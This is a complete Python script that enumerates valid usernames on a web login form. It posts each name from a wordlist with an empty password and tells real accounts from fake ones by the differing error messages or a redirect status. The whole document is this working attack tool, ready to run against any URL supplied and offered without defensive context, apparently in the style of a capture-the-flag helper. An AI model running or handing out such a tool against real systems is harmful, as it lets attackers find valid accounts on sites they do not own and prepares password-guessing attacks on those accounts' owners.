import requests
from colorama import Fore, init

init(autoreset=True)

def User_Enum(target_url, user_list):
    with open(user_list, "r") as file:
        users = file.readlines()
        print(f"{Fore.CYAN}[INFO]{Fore.RESET} User List Length : {len(users)}")
        for user in users:
            user = user.strip()

            data = {
                "username": user,
                "password": "",
                "submit": "Login"
            }

            response = requests.post(
                target_url,
                data=data,
                allow_redirects=True
            )

            if "Wrong password." in response.text or response.status_code == 301:
                print(f"{Fore.GREEN}[+] User Found:{Fore.RESET} {user}")
                y_n = input("Continue? Y/N: ").lower()
                if y_n == "y":
                    continue
                else:
                    print("Done...")
                    exit(0)
            elif "Wrong username or password." in response.text:
                print(f"{Fore.RED}[-] User Not Found:{Fore.RESET} {user}")
    
            else:
                print("Error!")
        print("Done...")
            
        
url = input("Enter URL:")
userlist = input("Enter User List: ")
User_Enum(url, userlist)
